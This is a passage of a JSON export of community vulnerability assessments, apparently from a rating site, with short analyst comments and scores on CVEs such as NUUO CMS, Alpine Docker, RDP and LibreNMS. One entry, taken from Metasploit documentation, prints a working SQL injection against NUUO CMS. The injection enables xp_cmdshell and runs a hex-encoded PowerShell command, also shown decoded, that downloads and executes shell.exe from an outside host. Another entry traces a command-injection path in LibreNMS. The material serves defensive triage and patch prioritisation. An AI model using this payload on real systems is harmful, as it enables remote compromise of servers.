      "document": "## Details\n\nDetails from [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/nuuo/nuuo_cms_fu.md) in Metasploit.\n\nThe COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the CMS Server. An example is below:\n\n```\nCOMMITCONFIG NUCM/1.0\nUser-Session-No: <session-number>\nFilename: <filename>\nFileType: <number>\nContent-Lenght: <file-length>\n\n<FILE_DATA>\n```\n\nThe vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\\\..\\\\) characters. Therefore, this function can be abused to overwrite any files in the installation drive of CMS Server.\n\nThis vulnerability is exploitable in CMS versions up to and including v2.4.\n\nThis module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "16c6caaf-a53f-42df-88c9-875af94f3161",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "b2ebbf0e-24e2-4432-8e53-7e8a540d8917",
      "created": "2019-05-09T17:57:42.669969Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Rubygems has a vulnerability that allows for arbitrary code execution while a gem is being installed. However, it's unclear how this is any worse than either using the malicious gem itself, or using the ability of gems to compile and execute arbitrary build instructions in the first place. It is interesting to be able to name a gem a particular way to create code execution. But you have to convince someone to install your gem in the first place. I presume that rubygems.org now prevents malicious gems from being published, but it would be interesting to see.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3,
        "urgent-to-patch": 2,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "5b35da11-af2c-4c12-b5c9-75b404d1b39d",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "18ccbd5b-9aa6-4591-ba7f-c6c0827fc9b2",
      "created": "2019-05-09T17:57:43.123841Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nDetails from [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/nuuo/nuuo_cms_sqli.md) in Metasploit.\n\nThe GETOPENALARM verb is used to obtain information about alarms stored in the CMS Server database. An example request is below:\n\n```\nGETOPENALARM NUCM/1.0\nDeviceID: <number>\nSourceServer: <server-id>\nLastOne: <number>\n```\n\nThe vulnerability is in the \"SourceServer\" parameter, which allows injection of arbitrary SQL characters, and can be abused to inject SQL into the executing statement. For example the following request:\n\n```\nGETOPENALARM NUCM/1.0\nDeviceID: 1\nSourceServer: ';drop table bobby;--\nLastOne: 3\n```\n\nWill cause the following SQL query to be executed on the server:\nSELECT AlarmNo, EventType, DeviceID, Channel, EventDesc, DateTime, PreviewImage, SourceServer, AlarmID, State, Priority, Owner, HistoryNo, PosTransaction, AlarmNote, AlarmType FROM AlarmLog WHERE DeviceID=1 AND SourceServer='';drop table bobby;-- ' AND State<20 order by DateTime DESC\n\nGiven that SQL Server 2005 Express is used by default (see vulnerability #2), this can be abused to enable xp_cmdshell and achieve remote code execution.\n\nAs as example, here is a full working exploit that downloads a reverse shell from http://10.0.99.102/shell.exe and executes it:\n\n```\n';exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; declare @q varchar(8000); select @q=0x78705f636d647368656c6c2027636420433a5c77696e646f77735c74656d705c202626206563686f202473746f726167654469723d24707764203e20776765742e707331202626206563686f2024776562636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74203e3e20776765742e707331202626206563686f202475726c203d2022687474703a2f2f31302e302e39392e3130322f7368656c6c2e65786522203e3e20776765742e707331202626206563686f202466696c65203d20227368656c6c2e65786522203e3e20776765742e707331202626206563686f2024776562636c69656e742e446f776e6c6f616446696c65282475726c2c2466696c6529203e3e20776765742e70733120262620706f7765727368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d4e6f4c6f676f202d4e6f6e496e746572616374697665202d4e6f50726f66696c65202d46696c6520776765742e70733120262620636d64202f6320433a5c77696e646f77735c74656d705c7368656c6c2e65786527; exec (@q);--\n```\n\nThe encoded part of the exploit is the following:\n\n```\nxp_cmdshell 'cd C:\\windows\\temp\\ && echo $storageDir=$pwd > wget.ps1 && echo $webclient = New-Object System.Net.WebClient >> wget.ps1 && echo $url = \"http://10.0.99.102/shell.exe\" >> wget.ps1 && echo $file = \"shell.exe\" >> wget.ps1 && echo $webclient.DownloadFile($url,$file) >> wget.ps1 && powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 && cmd /c C:\\windows\\temp\\shell.exe'\n```\n",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "d8470a7e-740d-4d00-9e88-592c3c27f43f",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "28ac45a0-c3e2-4f1c-9a45-2bb2fc9db88c",
      "created": "2019-05-09T17:57:44.593696Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nKernel type confusion noted via code review, but no direct exploit. Probably fixed later.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 2,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 4,
        "offensive-application": "primitive"
      },
      "tags": []
    },
    {
      "id": "f3c6665c-315b-435d-9f52-0d0354ff7fea",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "fa51a1d5-31ad-48dd-bf57-a47ed63ed067",
      "created": "2019-05-09T17:57:46.434663Z",
      "revisionDate": "2020-02-13T17:12:40.04592Z",
      "document": "## Details\n\nWith over 1 million installations of this plugin in Wordpress, this vulnerability is valuable to exploit.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "ff2f2b94-5094-4c15-95ce-8630d4aa3b5c",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "e8f30d5f-6ad3-40cf-9f3a-3a8fc548f306",
      "created": "2019-05-09T17:57:49.378745Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": " ",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "confidence-in-ratings": 3,
        "offensive-application": "post"
      },
      "tags": []
    },
    {
      "id": "1cea95ec-ca13-4f30-a828-9bd186b00602",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "d491e3c5-0222-4b85-906e-889c65e98892",
      "created": "2019-05-09T17:57:51.214416Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Documentation updated to discuss security risk, MS does not consider this a privilege boundary.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "697c2c1e-7e41-412d-92a8-66b77fa92776",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "e16ad535-6c7c-4d3d-9111-c3770d65732d",
      "created": "2019-05-10T20:48:02.271723Z",
      "revisionDate": "2020-02-13T17:12:39.129046Z",
      "document": "<<33",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 1,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "f23b546e-0fe0-4784-9d06-c746cb777321",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "791de258-978f-4690-a175-dc81f56f77f6",
      "created": "2019-05-10T20:53:57.017244Z",
      "revisionDate": "2020-02-13T17:12:38.934725Z",
      "document": "This wasn't vulnerable in OpenBSD, because it didn't free the memory the chip was writing memory to back to the kernel. On Linux boxes running a kernel < 2016, this could be RCE over wireless, and was proven to be a DoS, but for only a short time since the Grub mitigation that put the chip to sleep helped a lot.\r\n\r\nBasically depends on a lot of circumstances, on hardware that is increasingly aging and irrelevant.",
      "score": 0,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "ca617174-2087-4af6-9172-7116230bef96",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "d5179d87-2a4d-4212-998b-ad7c7469e731",
      "created": "2019-05-14T18:22:20.736033Z",
      "revisionDate": "2020-08-11T13:53:32.094423Z",
      "document": "Alpine Docker prior to 7 March 2019, (edge 20190228 snapshot, v3.9.2, v3.8.4, v3.7.3, v3.6.5) do not set a root password, allowing a user to escalate to root if the user installs `shadow` or `linux-pam`.  This docker image is used as a base for many custom-built docker containers and often-distributed images.\r\n\r\nOlder and unsupported containers can be mitigated by:\r\n```\r\n    # make sure root login is disabled\r\n    RUN sed -i -e 's/^root::/root:!:/' /etc/shadow\r\n```\r\n\r\nAlternatively you could make sure that you don\u2019t have linux-pam installed.\r\n\r\nWhat common docker images use Alpine?  Are any of them locked to older versions?  It may be worth looking through the Docker Hub to identify commonly downloaded/starred images: https://hub.docker.com/search?q=alpine&type=image",
      "score": 3,
      "metadata": {
        "versions": [
          "edge 20190228 snapshot",
          "3.9.2",
          "3.8.4",
          "3.7.3",
          "3.6.5"
        ],
        "mitigation": "available",
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "forever_day_versions": [
          "3.5",
          "3.4",
          "3.3"
        ],
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "d68cf001-dae7-4897-a7ad-26025232dd9e",
      "editorId": "42384bb5-f8e5-49ac-9f2a-a80bad70922f",
      "topicId": "d5179d87-2a4d-4212-998b-ad7c7469e731",
      "created": "2019-05-14T18:23:52.042937Z",
      "revisionDate": "2020-02-13T17:12:38.523648Z",
      "document": "I think this is a required field.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "403f0584-b06b-4028-acd5-b8aad323e277",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "d5179d87-2a4d-4212-998b-ad7c7469e731",
      "created": "2019-05-14T18:27:00.076535Z",
      "revisionDate": "2020-02-13T17:12:38.325245Z",
      "document": "Required?",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "cd61ed93-ff25-4bd8-8be7-73d4231a2bd3",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-05-14T18:32:02.177965Z",
      "revisionDate": "2020-04-19T03:03:55.511749Z",
      "document": "It is a scary vuln, and you should patch immediately.  As no PoC is out, don't trust the patch entirely and limit exposure to critical systems.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "1975e308-e0fe-495a-bfaf-31c3c6bda1aa",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-05-14T20:16:36.115684Z",
      "revisionDate": "2020-04-19T03:04:02.821157Z",
      "document": "Watch this one for details.  In the meantime, if you can't patch, then block TCP/3389 (or whatever port you might be mapping RDP to), enable Network Level Authentication (NLA), or disable RDP.\r\n\r\nThis exploit is critical.  RDP is ubiquitous in corporate settings, which are the most likely to have older Operating Systems deployed.  That issue is complicated by the general reasoning that most older Operating systems are there to support legacy equipment and are less likely to receive automated patching.\r\n\r\nEDIT (24-July-2019): Welp, we've heard lots of researchers say they're privately holding onto PoCs, but now PoCs and details are starting to surface.  It won't be long until this one is easily weaponized, and I'm willing to bet it's being used in the wild, if only in selected cases.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "8bd795bd-dc96-448a-be9b-79bf0431960d",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-05-14T20:21:48.611822Z",
      "revisionDate": "2020-02-13T17:12:37.737945Z",
      "document": "What Aaron said. I was neutral on ratings I don't have enough information on.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "c3d6e9a6-007c-415e-af8f-ae183c45266a",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "d5179d87-2a4d-4212-998b-ad7c7469e731",
      "created": "2019-05-14T20:23:22.616821Z",
      "revisionDate": "2020-02-13T17:12:37.539425Z",
      "document": "Easy container root if you encounter it.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "c936558c-5cb9-4aa0-a10a-e42f4bd72b9a",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-05-14T20:25:58.360938Z",
      "revisionDate": "2020-04-19T03:03:57.88236Z",
      "document": "This vuln is important to focus attention to. Pre-auth RCE on a likely large target base is very dangerous.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "a1b13c1b-585c-4620-a423-1e47c40ac2f9",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "d432d14a-94a1-4099-b6f6-959b6ef2a545",
      "created": "2019-05-22T13:34:16.554292Z",
      "revisionDate": "2020-10-21T20:31:22.122236Z",
      "document": "This vulnerability is important to patch given the ease by which an attacker can exploit a Confluence server.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "d00b1e72-0a53-4f9c-9f49-8821e7a96d63",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "7992242a-e0f4-4572-be13-859467611f09",
      "created": "2019-05-23T17:44:18.923842Z",
      "revisionDate": "2020-02-13T17:12:36.949176Z",
      "document": "Straight forward and reliable exploitation. No auth required. WebLogic is quite well known and it is also bundled in other products. Should be a pentester's favorite.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "41dd2d91-249f-494a-a2dc-f54952640d4d",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "8ce70150-f954-40de-8e58-d6b129e2c9ca",
      "created": "2019-05-28T18:41:24.724499Z",
      "revisionDate": "2020-02-13T17:12:36.601273Z",
      "document": "This is a local priv-esc 0-day, so there is no patch.  It uses a taskmanager file to provide escalated privileges.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "b0e854a8-9c60-42ac-8e3d-3323f2d7ce72",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "aefa1581-91e6-4bfd-963b-1f35a6cc494c",
      "created": "2019-05-28T18:43:35.231505Z",
      "revisionDate": "2020-02-13T17:12:36.376003Z",
      "document": "\u00a0",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 2
      },
      "tags": []
    },
    {
      "id": "625d92a4-fecb-4f3d-9d3f-ce2ced3131e2",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "aefa1581-91e6-4bfd-963b-1f35a6cc494c",
      "created": "2019-05-28T18:44:15.790592Z",
      "revisionDate": "2020-02-13T17:12:36.168957Z",
      "document": "\u00a0This need some sort of vector to trick the user. Probably not that hard via watering hole attack somewhere that vmware user congregate. ",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "e2284165-6345-44df-88e4-695b6199227a",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "aefa1581-91e6-4bfd-963b-1f35a6cc494c",
      "created": "2019-05-28T18:57:29.064907Z",
      "revisionDate": "2020-02-13T17:12:35.956015Z",
      "document": "From the theevilbit write-up I can't tell if arguments can be provided to the programs that are launched in the VMs. If arguments can be provided to the launched programs then this would be worse.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "b0b0c47d-ca03-4789-9061-af814bab6407",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "51b96c1d-026e-425e-a9db-d34a0951a7a1",
      "created": "2019-05-29T16:00:32.206052Z",
      "revisionDate": "2020-02-13T17:12:35.758735Z",
      "document": "Deserialization flaw. I tested a module that was able to get SYSTEM access by exploiting the flaw.",
      "score": 1,
      "metadata": {
        "exploitability": 4,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 2
      },
      "tags": []
    },
    {
      "id": "895a9de3-5515-4772-8302-50fb608ce85b",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "0fc2ed59-d350-4e33-bd2b-5cca877302dc",
      "created": "2019-05-30T15:16:47.809943Z",
      "revisionDate": "2020-02-13T17:12:35.559318Z",
      "document": "Useful exploit with a caveat. This exploit takes more effort to execute given that authentication is required first.\r\n\r\nAccording to the CVE listing on NVD, shell commands can be passed through the `_POST['community']` parameter to `html/pages/addhost.inc.php`, which deals with the creation of new devices. After successfully creating a device, a request can be sent to `ajax_output.php`, which triggers the actual execution of code through `html/includes/output/capture.inc.php`.\r\n\r\nIf the `community` parameter is set when a request is made to `addhost.inc.php`, then `community` is passed to the `clean()` function with the second argument set to `false`.\r\n\r\n```php\r\nif ($_POST['community']) \r\n{\r\n   $config['snmp']['community'] = array(clean($_POST['community'], false));\r\n}\r\n```\r\n\r\n\r\n\r\nThe `clean()` function is located in `includes/common.php`. Here's what it looks like in version `1.46`:\r\n\r\n```php\r\nfunction clean($value, $strip_tags = true)\r\n{\r\n    if ($strip_tags === true) {\r\n        return strip_tags(mres($value));\r\n    } else {\r\n        return mres($value);\r\n    }\r\n}\r\n```\r\n\r\n\r\n\r\nIn this particular call to `clean()`, the `$strip_tags` value is set to `false`, meaning that the `community` parameter is acted upon by the `mres()` function, then returned. The `mres()` function:\r\n\r\n```php\r\nfunction mres($string)\r\n{\r\n    return $string;\r\n    \r\n    global $database_link;\r\n    return mysqli_real_escape_string($database_link, $string);\r\n}\r\n```\r\n\r\nThe `community` parameter is simply returned without any modifications.\r\n\r\n\r\nFrom here, we can see that the `community` parameter is set through a POST request to `addhost.inc.php`, and it is unsanitized. Assuming that unwanted input is passed into the `community` parameter, now the goal is to see how a request to `ajax_output.php` will trigger code execution.\r\n\r\nIn `ajax_output.php`, the `id` is checked and is used to require another file. In this case, that would be `capture.inc.php`.\r\n\r\n```php\r\nif (isset($id))\r\n{\r\n    require $config['install_dir'] . \"/html/includes/output/$id.inc.php\";\r\n}\r\n```\r\n\r\n\r\n\r\nThe functionality in `capture.inc.php` runs a command that is determined by the `type` parameter and either prints the output of the command or saves the output to a file. Initially, the `type` parameter is checked against three different values. If the `type` parameter is `snmp` walk, the command becomes the output of the `gen_snmp_walk()` function. \r\n\r\n```php\r\n$type = $_REQUEST['type'];\r\n\r\nswitch ($type)\r\n{\r\n    case 'poller':\r\n        ...\r\n    case 'snmpwalk':\r\n        $device = device_by_name(mres($hostname));\r\n        $cmd = gen_snmpwalk_cmd($device, '.', ' -OUneb');\r\n    \t...\r\n    case 'discovery':\r\n        ...\r\n    default:\r\n        ...\r\n}\r\n```\r\n\r\n\r\n\r\nThe `gen_snmp_walk()`  function is located in the `snmp.inc.php` file. `gen_snmp_walk()` first checks the version that was passed in the `addhost` POST request earlier and then returns the result of calling `gen_snmp_cmd()`. The `gen_snmp_cmd()` also resides in the `snmp.inc.php` file, and this function is where the bulk of the command used in `capture.inc.php` is created.\r\n\r\nThe first addition to `$cmd` is set to the result of calling the `snmp_gen_auth()` function.\r\n\r\n```php\r\nfunction gen_snmp_cmd($cmd, $device, $oids, $options = null, $mib = null, $mibdir = null)\r\n{\r\n    ...\r\n    $cmd .= snmp_gen_auth($device);\r\n    ...\r\n}\r\n```\r\n\r\n\r\n\r\n`snmp_gen_auth()` further builds the `$cmd` variable by checking `snmpver`. If that value is either `v2c` or `v1`, then the unsanitized `community` parameter is added to the command and then returned.\r\n\r\n```php\r\n} elseif ($device['snmpver'] === 'v2c' or $device['snmpver'] === 'v1') {\r\n        $cmd  = \" -\".$device['snmpver'];\r\n        $cmd .= \" -c '\".$device['community'].\"'\";\r\n...\r\nreturn $cmd;\r\n```\r\n\r\n\r\n\r\nNow that there is a command that contains unsanitized input, code execution is the last step.\r\n\r\n\r\n\r\nAs was stated previously, the functionality in  `capture.inc.php` generates a command to run and either prints the output of that command or saves the output to a file. The functionality that runs the command checks the `format` parameter passed in the request made to `ajax_output.php` described earlier. If the `format` parameter is set to `text`, then this code block will be executed:\r\n\r\n```php\r\nif ($_GET['format'] == 'text') {\r\n    header(\"Content-type: text/plain\");\r\n    header('X-Accel-Buffering: no');\r\n\r\n    if (($fp = popen($cmd, \"r\"))) {\r\n        while (!feof($fp)) {\r\n            $line = stream_get_line($fp, 1024, PHP_EOL);\r\n            echo preg_replace('/\\033\\[[\\d;]+m/', '', $line) . PHP_EOL;\r\n            ob_flush();\r\n            flush(); // you have to flush buffer\r\n        }\r\n        fclose($fp);\r\n    }\r\n```\r\n\r\n \r\nThe `$cmd` variable that now contains the unsanitized `community` parameter gets passed to the `popen()` function and executed.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "8f29498f-b533-48cf-81ab-ef380fd22158",
      "editorId": "6d00a11d-d7a6-4e98-a7ed-834b16d67594",
      "topicId": "e16ad535-6c7c-4d3d-9111-c3770d65732d",
      "created": "2019-05-30T18:54:22.836436Z",
      "revisionDate": "2020-02-13T17:12:35.314942Z",
      "document": "\u00a0Testing sorting",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "fe6335db-8312-4311-9a50-7f2961ff7a07",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "0a30fb79-83ac-42d6-964b-dd2d15cdc6c2",
      "created": "2019-06-17T18:51:07.471555Z",
      "revisionDate": "2020-02-13T17:12:35.116436Z",
      "document": "The handling of objects in memory allowed for a double-free of a memory region, which could be used to escalate privileges on a local system. See MSRC link for vulnerable versions and patch information.\r\n\r\nThe https://github.com/ze0r/cve-2018-8453-exp PoC for x86 systems successfully worked for me on Win10 x86 systems. The x64 version did not work for me though.",
      "score": 1,
      "metadata": {
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "4c349a9a-5cb5-4d22-b040-4c70bd6ed7c0",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "b358b251-7e9d-453e-8802-e59a3de72faa",
      "created": "2019-06-17T21:06:27.075466Z",
      "revisionDate": "2020-02-13T17:12:34.913859Z",
      "document": "Likely a dud, but it's worth watching if this turns from a DoS to an RCE.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "1420d982-26bd-4a50-88c9-eb110fa97e99",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "1d624c3c-7f37-4d01-82c2-583bb1e19e4f",
      "created": "2019-06-20T14:10:48.728584Z",
      "revisionDate": "2020-02-13T17:12:34.723529Z",
      "document": "Given that the `enableCmdLineArguments ` setting is configured, it looks fairly easy to get code execution. This should definitely be patched.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "58e5f3fb-5f94-4691-a17d-e30283ebc676",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "0a30fb79-83ac-42d6-964b-dd2d15cdc6c2",
      "created": "2019-06-20T14:12:16.88115Z",
      "revisionDate": "2020-02-13T17:12:34.52875Z",
      "document": " ",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "ea2a92e0-6afc-4bc0-a02a-08849cfa8102",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "d2480fea-7daa-4890-8ba5-e81900050578",
      "created": "2019-06-25T13:44:11.245698Z",
      "revisionDate": "2020-02-13T17:12:34.334386Z",
      "document": "From the write-up by Grzegorz Wypych the vulnerability seems easy to exploit since the header is passed to an execve system call.",
      "score": 1,
      "metadata": {
        "exploitability": 5,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "1c21081c-ef63-4c20-a699-b66cf3c637c4",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "63c1e977-b118-475c-8c47-1046b294e1ba",
      "created": "2019-06-25T18:25:51.108791Z",
      "revisionDate": "2020-02-13T17:12:34.13386Z",
      "document": "There are a few PoCs for this one.  Exim is a bear to setup and I wouldn't be shocked to find unpatched servers because sysadmins don't want to touch them.  Since they'd be Internet-accessible, there's a lot of attacker utility here for the small population that uses Exim.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "958d14b2-a229-45a0-90c7-5491266ddd42",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "95f003c2-cc46-4a30-a9b8-806130b820a0",
      "created": "2019-06-28T15:23:21.981057Z",
      "revisionDate": "2020-02-13T17:12:33.940384Z",
      "document": "If this vulnerability is found in the wild, then it's likely that the target is vulnerable to CVE-2018-15710 as well. An attacker can get unauthenticated root access to a target given that it is vulnerable to both vulnerabilities, which means it is incredibly important to get this patched. A module now exists for this vulnerability, which further eases the process of exploitation.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "40b8d378-0f10-4045-b2d8-201b2e152e25",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "1c2dab3b-a909-41a6-96a1-f6046f177589",
      "created": "2019-06-28T17:16:03.142527Z",
      "revisionDate": "2020-02-13T17:12:33.727208Z",
      "document": "David Yesland write up showed how to get command execution on Windows, however using a similar request structure on Linux did not work. The execution on the application was compared between Windows and Linux to identify why command injection was not working on the Linux system.\r\n\r\nA breakpoint was set on the `doOCR` function that was mentioned in the analysis by David Yesland but that breakpoint was not hit while Apache Tika was running on Linux. After oberserving the call stack at `doOCR` on Windows, additional breakpoint were set in the IntelliJ debugger on Linux to identify where the execution between Windows and Linux differed. \r\n\r\nWhile determining which parsers can handle a client request, the Apache Tika application calls the `getSupportedTypes` method from the various parsers. The following `getSupportedTypes` method is from the `TesseractOCRParser` class.\r\n\r\n```java\r\n    public Set<MediaType> getSupportedTypes(ParseContext context) {\r\n        TesseractOCRConfig config = (TesseractOCRConfig)context.get(TesseractOCRConfig.class, DEFAULT_CONFIG);\r\n        return this.hasTesseract(config) ? SUPPORTED_TYPES : Collections.emptySet();\r\n    }\r\n```\r\n\r\nThe `config` variable is set with data that includes information from the client request. Then the `hasTesseract` method is called to identify whether a tesseract executable is available.\r\n\r\n```java\r\n    public boolean hasTesseract(TesseractOCRConfig 